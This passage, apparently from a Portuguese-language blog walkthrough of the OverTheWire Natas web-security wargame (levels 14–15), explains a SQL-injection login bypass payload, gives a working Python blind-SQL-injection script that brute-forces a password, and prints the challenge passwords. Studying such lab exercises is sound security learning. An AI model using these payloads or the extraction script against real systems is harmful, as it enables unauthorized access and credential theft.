> The file upload/7vljtrrrd5.php has been uploaded
> 
> GIF87az3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -> z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

## Nível 14

> Usuário: natas14
> 
> Senha: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
> 
> http://natas14.natas.labs.overthewire.org/

Logando no nível notamos outra página de *login* com usuário e senha desconhecidos, junto com um botão para verificar o código-fonte:

Código-fonte:

[![codigo-natas14.png](https://i.postimg.cc/xjNgq9nV/codigo-natas14.png)](https://postimg.cc/ThGn4MKt)

Nada de muito relevante, apenas que esse código é vunerável a [SQL injection](https://www.datacamp.com/pt/tutorial/sql-injection) na linha:

> $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

Isso significa que, se colocarmos uma condição que seja verdadeira no campo de usuário, podemos acessar o próximo desafio sem precisar da senha, por exemplo, se colocarmos algo como "1 = 1", essa afirmação sempre será verdadeira, logo o código vai ler esse essa tentativa de login como sendo correta (verdadeira).

Ao ajeitar a sintaxe, o usuário ficaria algo como:

> " OR 1=1;#

A senha não importa, só de usar esse usuário já conseguimos a senha:

> SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

## Nível 15

> Usuário: natas15
> 
> Senha: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
> 
> http://natas15.natas.labs.overthewire.org/

Nesse site temos uma situação parecida com o último desafio, porém, agora só temos um campo de usuário e não é uma página de login, apenas conseguimos checar se o usuário existe.

[![natas15.png](https://i.postimg.cc/d0Km7CQr/natas15.png)](https://postimg.cc/sMwZqvhg)

Por exemplo, se utilizarmos o usuário de natas16, a página retorna:

>  This user exists.
> 
> "Esse usuário existe."

Tembém temos um botão pra checar o código-fonte da página, porém, não há nada de relevante lá além do que a gente já sabe. Essa é uma questão de *"[blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)"*, onde precisamos descobrir a senha de um usuário sem ter a opção de validar sua senha, para isso, vamos montar um código em *[python](https://www.leansolutions.com.br/blog/python/)* para descobrir a senha através de *[brute force](https://www.fortinet.com/br/resources/cyberglossary/brute-force-attack)*.

Como esse código vai funcionar: vamos criar um alfabeto de caracteres possíveis na senha:

> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

Com esse alfabeto, o código irá testar o usuário junto com cada caracter em cada espaço da senha, se o caracter estiver correto, a página irá retornar que o usuário existe.

Código em python:

```
import requests
import string

chars = string.ascii_letters + string.digits
url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

password = ""

while len(password) < 32:
    for c in chars:
        payload = f'natas16" AND password LIKE BINARY "{password + c}%" #'
        r = requests.get(url, auth=auth, params={"username": payload})
        if "This user exists" in r.text:
            password += c
            print("Atual:", password)
            break

print("Final:", password)

```

Saída:

[![python-natas15.png](https://i.postimg.cc/nrg9yX3k/python-natas15.png)](https://postimg.cc/q6c7nvVh)

> hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

## Conclusão

O **Natas** em geral é um desafio muito completo sobre seguranças em aplicação web, ele aborda praticamente todos os conceitos fundamentais de vulnerabilidades que aparecem **cybersegurança** web.

Uma ótima ferramenta de aprendizado, tanto para um atacante quanto para um defensor, ele explora as vulnerabilidades de um jeito bem didático e prático, além disso, explica por que elas existem.

Cada nível introduz um conceito novo de forma acessível, mas sem abrir mão da profundidade. Ao longo dos desafios nós passamos a reconhecer padrões, e entendemos como pequenas falha de segurança podem ser tornar problemas reais.

Por fim, resolver o **Natas** não é apenas uma conquista, também é sobre adquirir a forma de pensar de um analista de segurança. Essa é, sem dúvida, uma das melhores bases possíveis para quem está começando ou para quem quer reforçar seus conhecimentos em segurança web.